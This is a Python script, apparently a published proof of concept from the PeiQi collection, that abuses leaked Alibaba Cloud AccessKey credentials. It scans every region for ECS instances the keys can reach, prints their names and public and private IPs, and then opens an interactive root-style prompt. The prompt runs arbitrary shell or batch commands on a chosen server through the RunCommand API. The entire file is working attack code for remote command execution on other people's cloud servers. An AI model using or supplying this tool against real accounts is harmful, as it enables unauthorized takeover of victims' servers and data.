#!/usr/bin/env python
#coding=utf-8

import json
import sys
import time

from aliyunsdkcore.client import AcsClient
from aliyunsdkcore.acs_exception.exceptions import ClientException
from aliyunsdkcore.acs_exception.exceptions import ServerException
from aliyunsdkecs.request.v20140526.DescribeInstanceStatusRequest import DescribeInstanceStatusRequest
from aliyunsdkecs.request.v20140526.DescribeRegionsRequest import DescribeRegionsRequest
from aliyunsdkecs.request.v20140526.DescribeInstancesRequest import DescribeInstancesRequest
from aliyunsdkecs.request.v20140526.DescribeInvocationResultsRequest import DescribeInvocationResultsRequest
from aliyunsdkecs.request.v20140526.RunCommandRequest import RunCommandRequest

def title():
    print('+------------------------------------------')
    print('+  \033[1;34mPOC_Des: http://red.peiqi.tech                                   \033[0m')
    print('+  \033[1;34m公众号 : PeiQi文库                                                 \033[0m')
    print('+  \033[1;34m关于脚本: 云服务器 AccessKey 密钥泄露API调用完成命令执行                 \033[0m')
    print('+  \033[1;36m主机ID  >>> i-xxxxxxxxxxxx(实例ID)                                  \033[0m')
    print('+  \033[1;36m[root@i-t4n90unxcqthw4kfkt63~]# exit (更换主机)                    \033[0m')
    print('+------------------------------------------')


def Linux_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host):
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Zhuji_Aliyun_City_Host)
    request = DescribeInstancesRequest()
    request.set_accept_format('json')
    InstanceId = [ZhuJi_ID]
    request.set_InstanceIds(InstanceId)

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')
    print(
    """
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    \033[1;31m -        +-------+                                                             \033[0m
    \033[1;31m -        | Linux |                OS: %s                                       \033[0m
    \033[1;31m -        |       |     -------->  IP: %s                                       \033[0m
    \033[1;31m -        |       |                Name: %s                                     \033[0m
    \033[1;31m -        +-------+                                                             \033[0m
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    """ % (
        json.loads(response)['Instances']['Instance'][0]['OSName'],
        json.loads(response)['Instances']['Instance'][0]['PublicIpAddress']['IpAddress'][0],
        json.loads(response)['Instances']['Instance'][0]['InstanceName'])
    )
    while True:
        Cmd = str(input("\033[5;37m[root@{}~]# \033[0m".format(ZhuJi_ID)))
        if Cmd == "exit":
            print("\033[1;31m-正在退出主机..... {} \033[0m".format(ZhuJi_ID))
            break
        Linux_exec(client, Cmd, ZhuJi_ID)


def Linux_exec(client, Cmd, ZHUJI_ID):
    request = RunCommandRequest()
    request.set_accept_format('json')

    request.set_Type("RunShellScript")
    request.set_CommandContent(Cmd)
    request.set_InstanceIds([ZHUJI_ID])
    request.set_Name("PeiQi")
    request.set_Description("PeiQi")
    request.set_Timed(False)

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')
    CommandId = json.loads(response)['CommandId']
    InvokeId  = json.loads(response)['InvokeId']
    #print(CommandId, InvokeId)
    time.sleep(1)
    request = DescribeInvocationResultsRequest()
    request.set_accept_format('json')

    request.set_InvokeId(InvokeId)
    request.set_InstanceId(ZHUJI_ID)
    request.set_CommandId(CommandId)
    request.set_ContentEncoding("PlainText")

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')
    Output = json.loads(response)['Invocation']['InvocationResults']['InvocationResult'][0]["Output"]
    print("\033[1;32m{}\033[0m".format(Output))

def Windows_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host):
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Zhuji_Aliyun_City_Host)
    request = DescribeInstancesRequest()
    request.set_accept_format('json')
    InstanceId = [ZhuJi_ID]
    request.set_InstanceIds(InstanceId)

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')
    print(
    """
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    \033[1;31m -        +-------+                                                             \033[0m
    \033[1;31m -        |Windows|               OS: %s                                       \033[0m
    \033[1;31m -        +-------+    -------->  IP: %s                                       \033[0m
    \033[1;31m -       /_______/                Name: %s                                     \033[0m
    \033[1;31m -                                                                              \033[0m
    \033[1;31m --------------------------------------------------------------------------------\033[0m
    """ % (
            json.loads(response)['Instances']['Instance'][0]['OSName'],
            json.loads(response)['Instances']['Instance'][0]['PublicIpAddress']['IpAddress'][0],
            json.loads(response)['Instances']['Instance'][0]['InstanceName'])
    )
    while True:
        Cmd = str(input("\033[5;37mC:\Windows\System32> \033[0m".format(ZhuJi_ID)))
        if Cmd == "exit":
            print("\033[1;31m-正在退出主机 {}.....  \033[0m".format(ZhuJi_ID))
            break
        Windows_exec(client, Cmd, ZhuJi_ID)

def Windows_exec(client, Cmd, ZHUJI_ID):
    request = RunCommandRequest()
    request.set_accept_format('json')

    request.set_Type("RunBatScript")
    request.set_CommandContent(Cmd)
    request.set_InstanceIds([ZHUJI_ID])
    request.set_Name("PeiQi")
    request.set_Description("PeiQi")
    request.set_Timed(False)

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')
    CommandId = json.loads(response)['CommandId']
    InvokeId  = json.loads(response)['InvokeId']
    #print(CommandId, InvokeId)
    time.sleep(1)
    request = DescribeInvocationResultsRequest()
    request.set_accept_format('json')

    request.set_InvokeId(InvokeId)
    request.set_InstanceId(ZHUJI_ID)
    request.set_CommandId(CommandId)
    request.set_ContentEncoding("PlainText")

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')
    Output = json.loads(response)['Invocation']['InvocationResults']['InvocationResult'][0]["Output"]
    print("\033[1;32m{}\033[0m".format(Output))


# 可用地域扫描
def Aliyun_City_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET):
    Aliyun_City = {}
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET)

    request = DescribeRegionsRequest()
    request.set_accept_format('json')

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')
    for i in range(0, 30):
        try:
            City_Host = json.loads(response)['Regions']['Region'][i]['RegionId']
            City_Name = json.loads(response)['Regions']['Region'][i]['LocalName']
            Aliyun_City[City_Name] = City_Host
        except:
            print('\033[1;34m ------ 搜索到有{}个可使用阿里云地域 ------\033[0m'.format(i))
            break
    return Aliyun_City

# 扫描账号下可控主机
def Aliyun_Number_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City):
    Aliyun_Serve_test_dict = []
    InstanceId_List = []
    for City in Aliyun_City.keys():
        Aliyun_City_Host = Aliyun_City[City]
        client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City_Host)

        try:
            request = DescribeInstanceStatusRequest()
            request.set_accept_format('json')
            response = client.do_action_with_exception(request)
            response = str(response, encoding='utf-8')
            Aliyun_Num = json.loads(response)['TotalCount']
            if Aliyun_Num != 0:
                print("\033[1;32m 扫描出 {} 共有 {}台云服务器 \033[0m".format(City, Aliyun_Num))
                for NUM in range(0, int(Aliyun_Num)):
                    InstanceId = json.loads(response)['InstanceStatuses']['InstanceStatus'][NUM]['InstanceId']
                    Aliyun_Serve_test(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, InstanceId, Aliyun_City_Host, NUM, Aliyun_Serve_test_dict)
                    InstanceId_List.append(InstanceId)

            else:
                print("\033[1;31m 扫描出 {} 共有 {}台云服务器 \033[0m".format(City, Aliyun_Num))
        except Exception as e:
            print("\033[1;31m 请求发送失败，请检查 API密钥 \033[0m", e)
            sys.exit(0)

    print("\033[1;36m 此 AccessKey 下共有 {} 台云服务器 \n\033[0m".format(len(Aliyun_Serve_test_dict)))
    while True:
        ZhuJi_ID = str(input("\033[35m 请输入 主机ID 进入服务器：\n 主机ID   >>> \033[0m"))
        if ZhuJi_ID in InstanceId_List:
            for data in Aliyun_Serve_test_dict:
                if ZhuJi_ID == data['InstanceId']:
                    Zhuji_Aliyun_City_Host = data['Aliyun_City_Host']
                    Zhuji_OS = data['OS']
                    if Zhuji_OS == "Linux":
                        Linux_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host)
                    else:
                        Windows_Cmd_Exec(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, ZhuJi_ID, Zhuji_Aliyun_City_Host)
        else:
            print("\033[1;31m 请求发送失败，请检查 主机ID是否正确 \033[0m")



def Aliyun_Serve_test(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, InstanceId, Aliyun_City_Host, NUM, Aliyun_Serve_test_dict):
    client = AcsClient(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City_Host)
    request = DescribeInstancesRequest()
    request.set_accept_format('json')
    InstanceId = [InstanceId]
    request.set_InstanceIds(InstanceId)

    response = client.do_action_with_exception(request)
    response = str(response, encoding='utf-8')

    NUM = int(NUM) + 1
    OSName = json.loads(response)['Instances']['Instance'][0]['OSName']
    if "Windows" in OSName:
        OS = "Windows"
    else:
        OS = "Linux"
    IpAddress_1 = json.loads(response)['Instances']['Instance'][0]['VpcAttributes']['PrivateIpAddress']['IpAddress'][0]
    IpAddress_2 = json.loads(response)['Instances']['Instance'][0]['PublicIpAddress']['IpAddress'][0]
    InstanceName = json.loads(response)['Instances']['Instance'][0]['InstanceName']
    InstanceId = InstanceId[0]
    Aliyun_Serve_test_dict.append({
        "InstanceId": InstanceId,
        "Aliyun_City_Host": Aliyun_City_Host,
        "OS":OS
    })
    print("\033[1;34m ({})   主机ID: {}   系统名称: {}   \n       外网IP： {}\n       内网IP： {}   \n       服务器名: {}\n \033[0m".format(NUM, InstanceId, OSName, IpAddress_2, IpAddress_1, InstanceName))



if __name__ == '__main__':
    title()
    ALIYUN_ACCESSKEYID = "xxxxxxxxxxx"
    ALIYUN_ACCESSKEYSECRET = "xxxxxxxxxxxxxxxxxxxx"
    Aliyun_City = Aliyun_City_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET)
    InstanceId_List = Aliyun_Number_Scan(ALIYUN_ACCESSKEYID, ALIYUN_ACCESSKEYSECRET, Aliyun_City)
